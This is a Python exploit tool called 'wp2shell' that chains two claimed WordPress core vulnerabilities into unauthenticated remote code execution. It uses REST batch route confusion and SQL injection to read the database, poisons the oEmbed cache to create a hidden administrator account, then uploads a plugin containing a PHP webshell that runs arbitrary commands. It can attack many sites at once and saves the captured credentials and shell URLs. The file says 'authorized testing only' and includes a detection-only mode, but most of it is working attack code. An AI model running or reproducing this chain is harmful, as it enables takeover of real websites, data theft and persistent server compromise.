#!/usr/bin/env python3
"""
wp2shell - CVE-2026-63030 (REST batch route confusion) + CVE-2026-60137
(author__not_in SQLi) chained to unauthenticated RCE in WordPress core
(6.9.0-6.9.4, 7.0.0-7.0.1).

Python 3 port of the wp2shell chain (CVE-2026-63030 + CVE-2026-60137),
validated against a local WordPress 6.9.4 lab. AUTHORIZED TESTING ONLY.

Chain:
  1. route confusion in /batch/v1 (parse-failed primer desyncs $matches)
  2. author_exclude SQLi -> blind + UNION reads on wp_posts (23 cols)
  3. oEmbed cache poisoning (predictable md5 post_name from known URLs)
  4. customize_changeset + nav_menu_item + request post graph -> user
     creation runs as an existing administrator
  5. login as the new admin -> upload plugin zip -> webshell -> RCE
"""

import argparse
import base64
import binascii
import hashlib
import io
import json
import os
import random
import re
import string
import sys
import traceback
import uuid
import zipfile
from multiprocessing.dummy import Pool as ThreadPool
from types import SimpleNamespace
from urllib.parse import quote, urlencode, urlsplit, urlunsplit

import requests

BANNER = r"""
  ███████╗  █████╗  ██╗  ██╗ ███╗   ███╗ ███████╗ ███████╗  ██████╗
  ██╔════╝ ██╔══██╗ ██║  ██║ ████╗ ████║ ██╔════╝ ██╔════╝ ██╔════╝
  ███████╗ ███████║ ███████║ ██╔████╔██║ ███████╗ █████╗   ██║
  ╚════██║ ██╔══██║ ██╔══██║ ██║╚██╔╝██║ ╚════██║ ██╔══╝   ██║
  ███████║ ██║  ██║ ██║  ██║ ██║ ╚═╝ ██║ ███████║ ███████╗ ╚██████╗
  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝     ╚═╝ ╚══════╝ ╚══════╝  ╚═════╝
      wp2shell | CVE-2026-63030 + CVE-2026-60137 Pre-Auth RCE Chain
                          github.com/sahmsec
"""

VERSION = "1.0.0"


def print_banner(version=VERSION):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    print(BANNER.strip("\n"))
    print("  [version %s]\n" % version)

# =======================
# Colors
# =======================
fr = "\033[91m"
fg = "\033[92m"
fy = "\033[93m"
fc = "\033[96m"
rs = "\033[0m"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
PRIMER = {"method": "POST", "path": "///"}
POST_DATE = "2020-01-01 00:00:00"
OEMBED_ARGS = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
SH = "SAHMSEC"
DEBUG = False

requests.packages.urllib3.disable_warnings()


def log(*a):
    print(" ".join(str(x) for x in a), flush=True)


def rand_str(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def hex_encode(t):
    return "''" if t == "" else "0x" + binascii.hexlify(t.encode()).decode()


class Client:
    def __init__(self, base, timeout=30.0, rest_route=None):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.rest_route = rest_route
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": USER_AGENT})

    def _endpoint(self, rr):
        return self.base + "/?rest_route=/batch/v1" if rr else self.base + "/wp-json/batch/v1"

    def resolve(self):
        if self.rest_route is not None:
            return
        for rr in (True, False):
            try:
                r = self.session.post(self._endpoint(rr), json={"requests": []}, timeout=self.timeout)
                if r.status_code == 200 and r.headers.get("Content-Type", "").startswith("application/json"):
                    self.rest_route = rr
                    if DEBUG:
                        log("[d] batch endpoint:", "rest_route" if rr else "wp-json")
                    return
            except Exception as e:
                if DEBUG:
                    log("[d] resolve fail", rr, e)
        self.rest_route = True

    def post(self, payload):
        self.resolve()
        r = self.session.post(self._endpoint(self.rest_route), json=payload, timeout=self.timeout)
        if DEBUG:
            log("[d] batch POST ->", r.status_code, r.text[:200])
        return r

    def rest_get(self, route, query):
        self.resolve()
        if self.rest_route:
            params = {"rest_route": route}
            if query:
                params.update(query)
            url = self.base + "/?" + urlencode(params)
        else:
            url = self.base + "/wp-json" + route + "?" + urlencode(query)
        r = self.session.get(url, timeout=self.timeout)
        return r.json()

    @staticmethod
    def _nested(inner_requests):
        return {"requests": [
            PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def inject(self, author_not_in):
        enc = quote(author_not_in, safe="")
        inner = [
            PRIMER,
            {"method": "GET", "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        return self.post(self._nested(inner))

    def union_inject(self, author_not_in):
        q = urlencode({"author_exclude": author_not_in, "orderby": "none", "per_page": "500"})
        inner = [
            PRIMER,
            {"method": "GET", "path": "/wp/v2/posts/999999?" + q},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        return self.post(self._nested(inner))

    def render_union(self, rows, tail=None):
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        q = urlencode({"author_exclude": union, "per_page": "-1", "orderby": "none", "context": "view"})
        inner = [
            PRIMER,
            {"method": "GET", "path": "/wp/v2/widgets?" + q},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        if tail:
            inner.extend(tail)
        return self.post(self._nested(inner))

    @staticmethod
    def rows(resp):
        try:
            body = resp.json()["responses"][1]["body"]["responses"][1]["body"]
        except Exception:
            return None
        return body if isinstance(body, list) else None

    def confusion(self):
        r = self.post({"requests": [
            PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]})
        codes = set()
        try:
            self._walk(r.json(), codes)
        except Exception:
            pass
        if DEBUG:
            log("[d] confusion codes:", sorted(codes))
        return all(c in codes for c in MARKER_CODES)

    def _walk(self, v, out):
        if isinstance(v, dict):
            if v.get("code") in MARKER_CODES:
                out.add(v["code"])
            for x in v.values():
                self._walk(x, out)
        elif isinstance(v, list):
            for x in v:
                self._walk(x, out)


# =======================
# SQL Injection
# =======================
class BlindSQLi:
    def __init__(self, client):
        self.client = client
        self.requests = 0

    def confirm(self):
        r1 = self._true("1=1")
        r2 = self._true("1=2")
        if DEBUG:
            log("[d] blind confirm: 1=1 -> %s, 1=2 -> %s" % (r1, r2))
        return r1 and not r2

    def _true(self, cond):
        self.requests += 1
        return bool(self.client.rows(self.client.inject("0) AND ({})-- -".format(cond))))

    def extract(self, expr, max_length=128):
        out = []
        for pos in range(1, max_length + 1):
            probe = "ASCII(SUBSTRING(COALESCE(({}),''),{},1))".format(expr, pos)
            if not self._true(probe + " > 0"):
                break
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self._true(probe + " > {}".format(mid)):
                    lo = mid + 1
                else:
                    hi = mid
            out.append(chr(lo))
        return "".join(out)

    def integer(self, expr):
        t = self.extract("SELECT ({})".format(expr)).strip()
        if not t.lstrip("-").isdigit():
            raise ValueError("expected int from {}, got {!r}".format(expr, t))
        return int(t)


class UnionSQLi:
    _COLUMNS = 23
    _TITLE_COL = 6
    _PUBLISH = hex_encode("publish")
    _POST = hex_encode("post")
    _DATE = hex_encode(POST_DATE)

    def __init__(self, client):
        self.client = client
        self.requests = 0
        self._re = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")

    def available(self):
        v = self._read("SELECT 0x4f4b")
        if DEBUG:
            log("[d] union available:", repr(v))
        return v == "OK"

    def extract(self, expr):
        return self._read(expr) or ""

    def integer(self, expr):
        t = (self._read("SELECT ({})".format(expr)) or "").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError("expected int from {}, got {!r}".format(expr, t))
        return int(t)

    def _read(self, expr):
        self.requests += 1
        resp = self.client.union_inject("0) UNION SELECT {}-- -".format(self._cols(expr)))
        m = self._re.search(resp.text)
        if not m:
            return None
        digits = m.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except Exception:
            return None

    def _cols(self, expr):
        cols = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1:
                cols.append("999999")
            elif i in (3, 4, 15, 16):
                cols.append(self._DATE)
            elif i == self._TITLE_COL:
                cols.append("CONCAT(0x7c7c,HEX(CAST(({})AS CHAR)),0x7c7c)".format(expr))
            elif i == 8:
                cols.append(self._PUBLISH)
            elif i == 21:
                cols.append(self._POST)
            else:
                cols.append(str(i))
        return ",".join(cols)


# =======================
# Admin Creator
# =======================
def post_row(row_id, body="", title="", status="publish", slug="", parent=0, kind="post", author=1):
    return ",".join([
        str(row_id), str(author), hex_encode(POST_DATE), hex_encode(POST_DATE),
        hex_encode(body), hex_encode(title), "''", hex_encode(status),
        hex_encode("closed"), hex_encode("closed"), "''", hex_encode(slug),
        "''", "''", hex_encode(POST_DATE), hex_encode(POST_DATE), "''",
        str(parent), "''", "0", hex_encode(kind), "''", "0",
    ])


class AdminCreator:
    _NAV_URL = "https://example.invalid/"

    def __init__(self, client):
        self.client = client

    def create(self):
        u = UnionSQLi(self.client)
        if not u.available():
            raise RuntimeError("UNION fake-post primitive unavailable")
        nonce = os.urandom(6).hex()
        prefix = self._prefix(u)
        admin_id = self._admin_id(u, prefix)
        embeds = self._loopback_urls(nonce)
        self._prime_oembed(embeds)
        backing = self._oembed_ids(u, prefix + "posts", embeds)

        name = "sahmsec_" + nonce
        pwd = "sahmsec!" + base64.urlsafe_b64encode(os.urandom(15)).rstrip(b"=").decode()
        email = name + "@wordpress.com"
        graph = _PoisonGraph(backing, admin_id)
        rows = graph.rows(self._changeset(graph.nav_item_id, admin_id), embeds[1])
        body = {"username": name, "password": pwd, "email": email, "roles": ["administrator"]}
        resp = self.client.render_union(rows, tail=[
            {"method": "POST", "path": "/wp/v2/users", "body": body},
            {"method": "POST", "path": "/wp/v2/users", "body": body},
        ])
        if DEBUG:
            log("[d] admin create resp:", resp.text[:500])
        return SimpleNamespace(username=name, password=pwd, email=email, source_admin_id=admin_id)

    def _prefix(self, u):
        t = u.extract("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
                      "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", t or ""):
            raise RuntimeError("could not recover wp_posts table name: {!r}".format(t))
        return t[:-5]

    def _admin_id(self, u, prefix):
        cap = hex_encode(prefix + "capabilities")
        ser = hex_encode('s:13:"administrator";b:1;')
        aid = u.integer("SELECT u.ID FROM `{}users` u JOIN `{}usermeta` m ON m.user_id=u.ID "
                        "WHERE m.meta_key={} AND INSTR(m.meta_value,{})>0 ORDER BY u.ID LIMIT 1"
                        .format(prefix, prefix, cap, ser))
        if aid < 1:
            raise RuntimeError("no existing administrator found")
        return aid

    def _loopback_urls(self, nonce):
        posts = self.client.rest_get("/wp/v2/posts", {"per_page": "1", "_fields": "link"})
        if not posts or not posts[0].get("link"):
            raise RuntimeError("no public post link for oEmbed seed")
        s = urlsplit(posts[0]["link"])
        return [urlunsplit((s.scheme, s.netloc, s.path, s.query, nonce + str(i))) for i in range(3)]

    def _prime_oembed(self, embeds):
        content = "".join('[embed width="500" height="750"]{}[/embed]'.format(u) for u in embeds)
        self.client.render_union([post_row(0, body=content, title="seed", slug="seed")])

    def _oembed_ids(self, u, posts_table, embeds):
        ids = []
        for url in embeds:
            key = hashlib.md5((url + OEMBED_ARGS).encode()).hexdigest()
            # HEX(post_name) = hex of the ASCII md5 chars = HEX(0x<ascii-hex of key>)
            # (quote-free + charset-safe: the 0x literal holds the ASCII bytes)
            literal = "0x" + binascii.hexlify(key.encode()).decode()
            ids.append(u.integer(
                "SELECT ID FROM `{}` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND HEX(post_name)=HEX({}) ORDER BY ID DESC LIMIT 1"
                .format(posts_table, literal)))
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError("could not recover 3 unique oEmbed cache IDs: {}".format(ids))
        return ids

    def _changeset(self, nav_item_id, user_id):
        return json.dumps({"nav_menu_item[{}]".format(nav_item_id): {
            "type": "nav_menu_item", "user_id": user_id, "value": {
                "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                "type": "custom", "title": "generated", "url": self._NAV_URL,
                "target": "", "attr_title": "", "description": "", "classes": "",
                "xfn": "", "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
            }}}, separators=(",", ":"))


class _PoisonGraph:
    def __init__(self, cache_ids, admin_id):
        self.cache_ids = cache_ids
        self.admin_id = admin_id
        self.outer_id = 1800000000 + random.randint(0, 100000000)
        self.nav_item_id = self.outer_id + 1
        self.inner_id = self.outer_id + 2
        self.changeset_id, self.cache_id, self.request_id = cache_ids

    def rows(self, changeset, trigger_url):
        return [
            post_row(0, body='[embed width="500" height="750"]{}[/embed]'.format(trigger_url),
                     title="trigger", slug="trigger"),
            post_row(self.changeset_id, body=changeset, title="changeset", status="future",
                     slug=str(uuid.uuid4()), parent=self.outer_id, kind="customize_changeset"),
            post_row(self.outer_id, body="outer", title="outer", status="draft", slug="outer",
                     parent=self.changeset_id),
            post_row(self.cache_id, title="cache", slug="cache", parent=self.changeset_id),
            post_row(self.nav_item_id, body="nav", title="nav", slug="nav", parent=self.request_id,
                     kind="nav_menu_item"),
            post_row(self.request_id, body="parse", title="parse", status="parse", slug="parse",
                     parent=self.inner_id, kind="request"),
            post_row(self.inner_id, body="inner", title="inner", status="draft", slug="inner",
                     parent=self.request_id),
        ]


# =======================
# Login + webshell deploy
# =======================
def wp_login(url, username, password):
    try:
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({"User-Agent": USER_AGENT})
        sess.post(url + "/wp-login.php",
                  data={"log": username, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": url + "/wp-admin/", "testcookie": "1"}, timeout=30)
        check = sess.get(url + "/wp-admin/", timeout=30)
        if "wp-admin" in check.url or "/wp-admin/profile.php" in check.text:
            return sess
    except Exception:
        pass
    return None


def upload_plugin(sess, url):
    try:
        page = sess.get(url + "/wp-admin/plugin-install.php?tab=upload", timeout=30)
        nonce = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', page.text)
        if not nonce:
            log(fc, "[-] plugin-upload nonce not found", rs)
            return None
        slug = rand_str(7)
        php = '<?php /* Plugin Name: sahmsec */ echo "SAHMSEC_OK"; if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(slug + "/" + slug + ".php", php)
        files = {"pluginzip": (slug + ".zip", buf.getvalue(), "application/zip")}
        data = {"_wpnonce": nonce.group(1), "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now"}
        sess.post(url + "/wp-admin/update.php?action=upload-plugin", data=data, files=files, timeout=60)
        shell_url = url + "/wp-content/plugins/{}/{}.php".format(slug, slug)
        check = sess.get(shell_url, timeout=10)
        if "SAHMSEC_OK" in check.text:
            return shell_url
        log(fc, "[-] webshell not reachable at", shell_url, rs)
        return None
    except Exception as e:
        log(fc, "[-] upload_plugin error:", e, rs)
        return None


# =======================
# Exploit
# =======================
def exploit(target, command=None):
    target = target.strip().rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    log(fc, "[*] Target:", target, rs)
    r0 = requests.get(target, timeout=15, verify=False)
    if r0.status_code != 200:
        log(fr, "[-] site not reachable (HTTP %s)" % r0.status_code, rs)
        return None
    if "wp-content" not in r0.text and "wp-includes" not in r0.text:
        log(fr, "[-] does not look like WordPress", rs)
        return None

    client = Client(target)
    log(fy, "[1/5] route-confusion probe (CVE-2026-63030)...", rs)
    if not client.confusion():
        log(fr, "[-] NOT vulnerable (patched 6.9.5+/7.0.2+ or endpoint blocked)", rs)
        return None
    log(fg, "[+] vulnerable (batch route confusion active)", rs)

    log(fy, "[2/5] SQLi (CVE-2026-60137)...", rs)
    s = BlindSQLi(client)
    if not s.confirm():
        log(fr, "[-] blind SQLi not confirmed", rs)
        return None
    db_name = s.extract("SELECT DATABASE()")
    db_user = s.extract("SELECT CURRENT_USER()")
    log(fg, "[+] blind SQLi OK | db=%s user=%s" % (db_name, db_user), rs)

    log(fy, "[3/5] creating administrator via oEmbed/loopback graph...", rs)
    creator = AdminCreator(client)
    admin = creator.create()
    log(fg, "[+] admin created: %s / %s" % (admin.username, admin.password), rs)

    log(fy, "[4/5] logging in as new admin...", rs)
    sess = wp_login(target, admin.username, admin.password)
    if not sess:
        log(fr, "[-] login failed", rs)
        return admin

    log(fy, "[5/5] uploading plugin webshell...", rs)
    shell_url = upload_plugin(sess, target)
    if not shell_url:
        log(fr, "[-] webshell upload failed", rs)
        return admin

    log(fg, "[+] webshell: %s?cmd=<command>" % shell_url, rs)
    if command:
        r = sess.get(shell_url, params={"cmd": command}, timeout=60)
        out = r.text.replace("SAHMSEC_OK", "").strip()
        log(fg, "[+] command output:\n%s" % out, rs)
    return SimpleNamespace(admin=admin, shell_url=shell_url)


def check_only(target):
    """Non-destructive detection: route-confusion probe + SQLi confirmation
    + lightweight info disclosure. Creates nothing on the target."""
    target = target.strip().rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target
    client = Client(target)
    log(fy, "[check] route-confusion probe (CVE-2026-63030)...", rs)
    if not client.confusion():
        log(fr, "[-] NOT vulnerable (patched 6.9.5+/7.0.2+ or endpoint blocked)", rs)
        return False
    log(fg, "[+] vulnerable (batch route confusion active)", rs)
    log(fy, "[check] SQLi confirmation (CVE-2026-60137)...", rs)
    s = BlindSQLi(client)
    if not s.confirm():
        log(fr, "[-] blind SQLi not confirmed", rs)
        return True
    u = UnionSQLi(client)
    if not u.available():
        log(fr, "[-] blind SQLi OK but UNION primitive unavailable", rs)
        return True
    db_name = s.extract("SELECT DATABASE()")
    db_user = s.extract("SELECT CURRENT_USER()")
    log(fg, "[+] SQLi confirmed | db=%s user=%s | UNION primitive available" % (db_name, db_user), rs)
    return True


def main():
    global DEBUG
    ap = argparse.ArgumentParser(description="wp2shell - CVE-2026-63030 + CVE-2026-60137 PoC (authorized testing only)")
    ap.add_argument("--target", help="single target URL")
    ap.add_argument("--list", help="file with target URLs (one per line)")
    ap.add_argument("--command", help="command to run via the webshell once deployed")
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--debug", action="store_true", help="verbose request/response logging")
    ap.add_argument("--out", help="append results to file")
    ap.add_argument("--no-banner", action="store_true", help="suppress the banner")
    ap.add_argument("--check-only", action="store_true",
                    help="non-destructive detection only (no admin, no webshell)")
    args = ap.parse_args()
    DEBUG = args.debug

    if not args.no_banner:
        print_banner()

    if args.check_only:
        if args.list:
            for t in [l.strip() for l in open(args.list, encoding="utf-8") if l.strip()]:
                log(fc, "\n[*] Target: %s" % t, rs)
                check_only(t)
        elif args.target:
            check_only(args.target)
        else:
            ap.error("--check-only requires --target or --list")
        return

    if args.list:
        targets = [l.strip() for l in open(args.list, encoding="utf-8") if l.strip()]
        log(fy, "[*] Testing %d target(s)" % len(targets), rs)

        def run_one(t):
            try:
                return {"target": t, "result": exploit(t, args.command)}
            except Exception as e:
                log(fr, "[-] %s -> error: %s" % (t, e), rs)
                return {"target": t, "result": None}

        pool = ThreadPool(args.threads)
        results = pool.map(run_one, targets)
        pool.close()
        pool.join()

        out_rows = []
        for row in results:
            res = row["result"]
            if res is None:
                out_rows.append({"target": row["target"], "status": "not_exploited"})
                continue
            rec = {"target": row["target"], "status": "rce" if getattr(res, "shell_url", None) else "partial",
                   "username": getattr(res.admin, "username", None),
                   "password": getattr(res.admin, "password", None),
                   "shell": getattr(res, "shell_url", None)}
            out_rows.append(rec)
        if args.out:
            with open(args.out, "w", encoding="utf-8") as f:
                json.dump(out_rows, f, indent=2)
            log(fg, "[+] results written to %s" % args.out, rs)
        return
    if not args.target:
        ap.error("either --target or --list is required")
    res = exploit(args.target, args.command)
    if res is not None and args.out:
        with open(args.out, "a", encoding="utf-8") as f:
            f.write(json.dumps({"target": args.target,
                                "username": getattr(res.admin, "username", None),
                                "password": getattr(res.admin, "password", None),
                                "shell": getattr(res, "shell_url", None)}, indent=2) + "\n")
            log(fg, "[+] results appended to %s" % args.out, rs)


if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
        sys.exit(1)
